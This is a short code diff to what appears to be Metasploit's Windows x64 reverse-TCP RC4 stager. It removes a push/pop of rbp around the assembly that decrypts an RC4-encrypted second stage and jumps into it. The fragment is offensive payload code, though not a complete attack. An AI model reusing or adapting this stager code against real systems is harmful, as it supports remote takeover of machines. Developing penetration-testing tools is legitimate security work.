@@ -167,7 +167,6 @@ module Payload::Windows::ReverseTcpRc4_x64
         pop rdi                 ; address of S-box
         pop rcx                 ; stage length
         pop r9                  ; address of stage
-        push rbp                ; push back so we can return into it
         push r14                ; save socket
         call after_key          ; Call after_key, this pushes the address of the key onto the stack.
         db #{raw_to_db(opts[:rc4key])}
@@ -175,7 +174,6 @@ module Payload::Windows::ReverseTcpRc4_x64
         pop rsi                 ; rsi = RC4 key
       #{asm_decrypt_rc4}
         pop rdi                 ; restrore socket handle
-        pop rbp                 ; restore rbp
         jmp r15                 ; return into the second stage
     ^
 
